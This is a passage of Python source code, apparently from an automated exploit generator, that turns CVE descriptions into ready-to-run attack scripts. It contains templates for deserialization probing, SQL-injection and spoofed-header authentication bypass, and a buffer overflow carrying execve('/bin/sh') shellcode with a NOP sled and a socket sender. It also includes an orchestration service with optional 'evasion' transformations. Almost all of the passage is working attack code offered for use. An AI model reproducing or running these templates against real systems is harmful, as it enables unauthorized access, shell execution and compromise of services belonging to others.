            "java": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAF4"
        }}
        
        for format_type, payload in payloads.items():
            try:
                # Test different parameters
                test_params = ["data", "payload", "object", "serialized"]
                
                for param in test_params:
                    response = self.session.post(
                        self.target_url,
                        data={{param: payload}}
                    )
                    
                    # Check for deserialization indicators
                    if response.status_code in [200, 500] and len(response.text) > 0:
                        print(f"[+] Potential {{format_type}} deserialization found")
                        return True
                        
            except Exception as e:
                continue
                
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
        print(f"Example: python3 {{sys.argv[0]}} http://target.com/deserialize")
        sys.exit(1)
    
    target_url = sys.argv[1]
    exploit = DeserializationExploit(target_url)
    
    print(f"[+] Deserialization Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")
    
    if exploit.test_deserialization():
        print("[+] Deserialization vulnerability confirmed!")
    else:
        print("[-] No deserialization vulnerability found")

if __name__ == "__main__":
    main()
'''


def _deserialization_param_builder(request: PayloadRequest, details: Dict[str, Any]) -> Dict[str, Any]:
    return _common_params(request)


DESERIALIZATION = PayloadTemplate(family="deserialization", body=_DESERIALIZATION_BODY,
                                   param_builder=_deserialization_param_builder)


# --- AUTH_BYPASS -----------------------------------------------------------
_AUTH_BYPASS_BODY = '''#!/usr/bin/env python3
# Authentication Bypass Exploit for {cve_id}
# Vulnerability: {description_snippet_100}...

import requests
import sys

class AuthBypassExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        
    def test_sql_auth_bypass(self):
        """Test SQL injection authentication bypass"""
        print("[+] Testing SQL injection auth bypass...")
        
        bypass_payloads = [
            "admin' --",
            "admin' #",
            "admin'/*",
            "' or 1=1--",
            "' or 1=1#",
            "') or '1'='1--",
            "admin' or '1'='1",
        ]
        
        for payload in bypass_payloads:
            try:
                data = {{
                    "username": payload,
                    "password": "anything"
                }}
                
                response = self.session.post(
                    f"{{self.target_url}}/login",
                    data=data
                )
                
                # Check for successful login indicators
                success_indicators = [
                    "dashboard", "welcome", "logout", "admin panel",
                    "successful", "redirect"
                ]
                
                if any(indicator in response.text.lower() for indicator in success_indicators):
                    print(f"[+] SQL injection bypass successful: {{payload}}")
                    return True
                    
            except Exception as e:
                continue
                
        return False
    
    def test_header_bypass(self):
        """Test header-based authentication bypass"""
        print("[+] Testing header-based auth bypass...")
        
        bypass_headers = [
            {{"X-Forwarded-For": "127.0.0.1"}},
            {{"X-Real-IP": "127.0.0.1"}},
            {{"X-Remote-User": "admin"}},
            {{"X-Forwarded-User": "admin"}},
            {{"Authorization": "Bearer admin"}},
        ]
        
        for headers in bypass_headers:
            try:
                response = self.session.get(
                    f"{{self.target_url}}/admin",
                    headers=headers
                )
                
                if response.status_code == 200:
                    print(f"[+] Header bypass successful: {{headers}}")
                    return True
                    
            except Exception as e:
                continue
                
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
        print(f"Example: python3 {{sys.argv[0]}} http://target.com")
        sys.exit(1)
    
    target_url = sys.argv[1]
    exploit = AuthBypassExploit(target_url)
    
    print(f"[+] Authentication Bypass Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")
    
    success = False
    if exploit.test_sql_auth_bypass():
        print("[+] SQL injection authentication bypass confirmed!")
        success = True
        
    if exploit.test_header_bypass():
        print("[+] Header-based authentication bypass confirmed!")
        success = True
        
    if not success:
        print("[-] No authentication bypass found")

if __name__ == "__main__":
    main()
'''


def _auth_bypass_param_builder(request: PayloadRequest, details: Dict[str, Any]) -> Dict[str, Any]:
    return _common_params(request)


AUTH_BYPASS = PayloadTemplate(family="authentication_bypass", body=_AUTH_BYPASS_BODY,
                               param_builder=_auth_bypass_param_builder)


# --- BUFFER_OVERFLOW --------------------------------------------------------
_BUFFER_OVERFLOW_BODY = '''#!/usr/bin/env python3
# Buffer Overflow Exploit for {cve_id}
# Architecture: {arch}
# Vulnerability: {description_snippet_100}...

import struct
import socket
import sys

class BufferOverflowExploit:
    def __init__(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = int(target_port)
        
    def create_pattern(self, length):
        """Create cyclic pattern for offset discovery"""
        pattern = ""
        for i in range(length):
            pattern += chr(65 + (i % 26))  # A-Z pattern
        return pattern
    
    def generate_shellcode(self):
        """Generate shellcode for {arch}"""
        if "{arch}" == "x86":
            # x86 execve("/bin/sh") shellcode
            shellcode = (
                "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
                "\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
            )
        else:
            # x64 execve("/bin/sh") shellcode
            shellcode = (
                "\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73"
                "\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05"
            )
        
        return shellcode.encode('latin-1')
    
    def create_exploit(self, offset=140):
        """Create buffer overflow exploit"""
        print(f"[+] Creating buffer overflow exploit...")
        print(f"[+] Offset: {{offset}} bytes")
        
        # Pattern to reach return address
        padding = "A" * offset
        
        if "{arch}" == "x86":
            # x86 return address (example)
            ret_addr = struct.pack("<I", 0x08048080)  # Adjust for target
        else:
            # x64 return address (example)
            ret_addr = struct.pack("<Q", 0x0000000000401000)  # Adjust for target
        
        # NOP sled
        nop_sled = "\\x90" * 16
        
        # Shellcode
        shellcode = self.generate_shellcode()
        
        exploit = padding.encode() + ret_addr + nop_sled.encode('latin-1') + shellcode
        
        print(f"[+] Exploit size: {{len(exploit)}} bytes")
        return exploit
    
    def send_exploit(self, payload):
        """Send exploit to target"""
        try:
            print(f"[+] Connecting to {{self.target_host}}:{{self.target_port}}")
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_host, self.target_port))
            
            print("[+] Sending exploit...")
            sock.send(payload)
            
            # Try to interact
            try:
                response = sock.recv(1024)
                print(f"[+] Response: {{response}}")
            except Exception:
                pass
                
            sock.close()
            print("[+] Exploit sent successfully")
            
        except Exception as e:
            print(f"[-] Error: {{e}}")

def main():
    if len(sys.argv) != 3:
        print(f"Usage: python3 {{sys.argv[0]}} <target_host> <target_port>")
        print(f"Example: python3 {{sys.argv[0]}} 192.168.1.100 9999")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = sys.argv[2]
    
    exploit = BufferOverflowExploit(target_host, target_port)
    
    print(f"[+] Buffer Overflow Exploit for {cve_id}")
    print(f"[+] Target: {{target_host}}:{{target_port}}")
    print(f"[+] Architecture: {arch}")
    
    # Create and send exploit
    payload = exploit.create_exploit()
    exploit.send_exploit(payload)

if __name__ == "__main__":
    main()
'''


def _buffer_overflow_param_builder(request: PayloadRequest, details: Dict[str, Any]) -> Dict[str, Any]:
    params = _common_params(request)
    params["arch"] = request.target_arch
    return params


BUFFER_OVERFLOW = PayloadTemplate(family="buffer_overflow", body=_BUFFER_OVERFLOW_BODY,
                                   param_builder=_buffer_overflow_param_builder)


def default_template_registry() -> PayloadTemplateRegistry:
    registry = PayloadTemplateRegistry()
    for template in (SQLI, XSS, FILE_READ, GENERIC, RCE, XXE, DESERIALIZATION, AUTH_BYPASS, BUFFER_OVERFLOW):
        registry.register(template)
    return registry


# ============================================================================
# PayloadValidationPolicy
# ============================================================================

class PayloadValidationPolicy:
    """Defensive input coercion/validation.

    The original ``generate_exploit_from_cve`` performs no real validation
    of its own - it relies on ``dict.get(..., default)`` throughout and a
    single blanket try/except around the whole method. The two real
    callers (the ``/exploit-generate`` route and the attack-chains
    enhancement path) always pass well-formed dicts, so this policy's
    stricter checks have zero effect on any current caller; they exist to
    give the new architecture a genuinely testable validation boundary
    for malformed input that nothing today actually sends.
    """

    def validate(self, cve_data: Optional[Dict[str, Any]], target_info: Optional[Dict[str, Any]]) -> PayloadRequest:
        if cve_data is not None and not isinstance(cve_data, dict):
            raise PayloadValidationError(f"cve_data must be a dict, got {type(cve_data).__name__}")
        if target_info is not None and not isinstance(target_info, dict):
            raise PayloadValidationError(f"target_info must be a dict, got {type(target_info).__name__}")

        cve_data = cve_data or {}
        target_info = target_info or {}

        return PayloadRequest(
            cve_id=cve_data.get("cve_id", ""),
            description=cve_data.get("description", ""),
            target_arch=target_info.get("target_arch", "x64"),
            evasion_level=target_info.get("evasion_level", "none"),
        )


# ============================================================================
# PayloadGenerationService
# ============================================================================

class PayloadGenerationService:
    """Thin orchestration layer: validate -> classify -> select existing
    template -> render -> return current-compatible result."""

    def __init__(self,
                 validation_policy: Optional[PayloadValidationPolicy] = None,
                 analyzer: Optional[VulnerabilityDetailsAnalyzer] = None,
                 template_registry: Optional[PayloadTemplateRegistry] = None,
                 transformation_registry: Optional[PayloadTransformationRegistry] = None,
                 renderer: Optional[PayloadRenderer] = None,
                 instructions_renderer: Optional[InstructionsRenderer] = None) -> None:
        self._validation_policy = validation_policy or PayloadValidationPolicy()
        self._analyzer = analyzer or VulnerabilityDetailsAnalyzer()
        self._template_registry = template_registry or default_template_registry()
        self._transformation_registry = transformation_registry or default_transformation_registry()
        self._renderer = renderer or PayloadRenderer()
        self._instructions_renderer = instructions_renderer or InstructionsRenderer()

    def generate_exploit_from_cve(self, cve_data: Dict[str, Any], target_info: Dict[str, Any]) -> Dict[str, Any]:
        try:
            request = self._validation_policy.validate(cve_data, target_info)
            # The original AIExploitGenerator lowercased the description before
            # classification AND detail-extraction (it passed `description.lower()`
            # into `_analyze_vulnerability_details`), so endpoint/parameter/
            # software/version regexes all ran against lowercased text. The raw
            # (original-case) description is still used for the rendered snippets,
            # exactly as the original read them back from `cve_data`. Passing the
            # lowercased description here preserves that behavior byte-for-byte.
            vuln_type, details = self._analyzer.analyze(request.description.lower())

            template = self._template_registry.get(vuln_type) if vuln_type in self._template_registry.list_families() \
                else self._template_registry.get("generic")
            transformation = self._transformation_registry.get(request.evasion_level) \
                if request.evasion_level != "none" else None

            exploit_code = self._renderer.render(request, template, details, transformation)
            instructions = self._instructions_renderer.render(vuln_type, request, details, cve_data)

            result = PayloadResult(
                success=True,
                cve_id=request.cve_id,
                vulnerability_type=vuln_type,
                specific_details=details,
                exploit_code=exploit_code,
                instructions=instructions,
                evasion_applied=request.evasion_level,
                implementation_type="real_cve_based",
            )
            return result.to_dict()

        except Exception as exc:
            return PayloadResult(success=False, error=str(exc)).to_dict()
